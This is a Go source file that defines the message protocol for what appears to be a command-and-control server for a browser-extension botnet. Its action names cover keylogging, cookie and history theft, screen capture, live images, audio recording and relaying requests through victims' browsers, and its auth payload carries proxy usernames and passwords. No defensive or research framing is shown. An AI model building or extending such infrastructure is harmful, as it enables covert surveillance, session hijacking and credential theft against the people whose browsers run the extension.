// Package ws hosts the bot-facing WebSocket server and the per-bot
// RPC dispatch table. All wire-level shapes (action names, message
// envelope) match the Node.js server.js so existing browser
// extensions need no changes.
package ws

import "encoding/json"

// Action names used in the bot <-> server protocol.
// Mirrors server.js RPC_CALL_TABLE plus a few server-issued actions.
const (
	ActionPing               = "PING"
	ActionPong               = "PONG"
	ActionAuth               = "AUTH"
	ActionSync               = "SYNC"
	ActionSyncHuge           = "SYNC_HUGE"
	ActionState              = "STATE"
	ActionRealtimeImg        = "REALTIME_IMG"
	ActionScreenCaptureData  = "SCREEN_CAPTURE_DATA"
	ActionUserActivity       = "USER_ACTIVITY"
	ActionDebugLog           = "DEBUG_LOG"
	ActionKeyboardLogs       = "KEYBOARD_LOGS"
	ActionAudioData          = "AUDIO_DATA"
	ActionGetCookies         = "GET_BROWSER_COOKIE_ARRAY"
	ActionGetHistory         = "GET_BROWSER_HISTORY_ARRAY"
	ActionTabNavigateAndFetch = "TAB_NAVIGATE_AND_FETCH"
	ActionStopTabNavigate    = "STOP_TAB_NAVIGATE"
	ActionSendRequestViaBrowser = "SEND_REQUEST_VIA_BROWSER"
	ActionStartAudioRecording   = "START_AUDIO_RECORDING"
	ActionStopAudioRecording    = "STOP_AUDIO_RECORDING"
)

// Envelope is the universal message body used over the WS link.
// Format matches server.js: {id, version, action, data, origin_action?}.
//
// The extension shipped with this project uses `result` instead of
// `data` for its RPC responses. We accept both: on unmarshal we look
// at Data first; if empty and Result is set we fall back to that. The
// helper Payload() makes this transparent to callers.
type Envelope struct {
	ID           string          `json:"id"`
	Version      string          `json:"version,omitempty"`
	Action       string          `json:"action"`
	Data         json.RawMessage `json:"data,omitempty"`
	Result       json.RawMessage `json:"result,omitempty"`
	OriginAction string          `json:"origin_action,omitempty"`
}

// Payload returns the response body regardless of which field name the
// client used.
func (e *Envelope) Payload() json.RawMessage {
	if len(e.Data) > 0 {
		return e.Data
	}
	return e.Result
}

// AuthData is the payload of an AUTH message issued by the server during
// handshake. The bot replies with its browser_id (and possibly other
// fields) inside its own AUTH envelope.
type AuthData struct {
	BrowserID     string `json:"browser_id,omitempty"`
	ProxyUsername string `json:"proxy_username,omitempty"`
	ProxyPassword string `json:"proxy_password,omitempty"`
	Version       string `json:"version,omitempty"`
}
